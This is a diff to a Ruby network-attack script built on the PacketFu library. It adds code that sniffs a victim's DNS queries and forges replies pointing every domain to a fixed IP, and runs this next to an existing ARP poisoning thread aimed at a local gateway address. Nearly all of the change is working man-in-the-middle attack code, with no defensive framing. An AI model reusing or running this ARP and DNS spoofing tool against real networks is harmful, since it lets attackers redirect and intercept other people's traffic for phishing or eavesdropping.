@@ -78,19 +78,95 @@ def revertArpPackets(intface, victimIP)
 	
 end
 
+def sendResponse(packet, domainName)
+	# Convert the IP address
+	facebookIP = "69.171.234.21"
+	myIP = facebookIP.split(".");
+	myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
+
+	# Create the UDP packet
+	response = UDPPacket.new()#:config => @srcInfo)
+	response.udp_src = packet.udp_dst
+	response.udp_dst = packet.udp_src
+	response.ip_saddr = packet.ip_daddr
+	response.ip_daddr = @victimIP
+	response.eth_daddr = @victimMAC
+
+	# Transaction ID
+	response.payload = packet.payload[0,2]
+
+	response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
+
+	# Domain name
+	domainName.split(".").each do |section|
+	response.payload += section.length.chr
+	response.payload += section
+	end
+
+	# Set more default values...........
+	response.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
+	response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00" + "\x04"
+
+	# IP
+	response.payload += myIP2
+
+	# Calculate the packet
+	response.recalc
+
+	# Send the packet out
+	response.to_w(@interface)	
+
+end
+def getDomainName(rawDomain)
+        domainName = ""
+        
+        while true
+            
+            # Get the length of the next section of the domain name
+            length = rawDomain[0].to_i
+            puts "%i" % length
+            if length == 0
+                # We have all the sections, so send it back
+                return domainName = domainName[0, domainName.length - 1]
+            elsif length != 0
+                # Copy the section of the domain name over
+                domainName += rawDomain[1, length] + "."
+                rawDomain = rawDomain[length + 1..-1]
+            else
+
+                # Malformed packet!
+                return nil
+            end
+        end
+    end
+
 def initDns(intface, victimIP)
 	iface = intface
-	capture_session = PacketFu::Capture.new(:iface => iface, :start => true, :promisc => true,
-	:filter => "udp and port 53" ) #'udp[10] & 128 = 0' and and  src = " + victimIP
-
+	filter = "udp and port 53  and  src " + victimIP #and udp[10]&0x80 = 0
+	capture_session = PacketFu::Capture.new(
+		:iface => iface, 
+		:start => true, 
+#		:promisc => true,
+		:filter => filter ) 
+	puts "dns stream" 
 	capture_session.stream.each do |packet|
-		if UDPPacket.can_parse?(packet)
+		if PacketFu::UDPPacket.can_parse?(packet)
 			puts "dns packet found!" 
-			pkt = Packet.parse packet
+			pkt = PacketFu::Packet.parse packet
 			packet_info = [pkt.ip_saddr, pkt.ip_daddr]
-			src_ip = "%s" % packet_info
-			dst_ip = "%s" % packet_info
-			#puts_verbose(packet, src_ip, dst_ip)
+			src_ip = "%s" % packet_info[0]
+			dst_ip = "%s" % packet_info[1]
+			 
+
+
+
+			domainName = getDomainName(pkt.payload[12..-1])
+
+			if domainName == nil
+				next
+			end
+			puts "DNS request for: " + domainName
+			sendResponse(pkt, domainName)
 		end
 	end
 
@@ -109,9 +185,11 @@ begin
 
 	puts "Starting the ARP poisoning thread..."
 	spoof_thread = Thread.new{initArpPackets("em1","192.168.0.1")} 
-	dns_thread = Thread.new{initDns("em1","192.168.0.1")} 
-	spoof_thread.join
-	dns_thread.join
+	#dns_thread = Thread.new{initDns("em1","192.168.0.1")} 
+initDns("em1","192.168.0.1")	
+spoof_thread.join
+	#dns_thread.join
+	
 
 
 	 # Catch the interrupt and kill the threads
@@ -120,7 +198,7 @@ begin
 	Thread.kill(spoof_thread)
 		
 	revertArpPackets("em1","192.168.0.1")
-	Thread.kill(dns_thread)
+	#Thread.kill(dns_thread)
 	`echo 0 > /proc/sys/net/ipv4/ip_forward`
 	exit 0
 
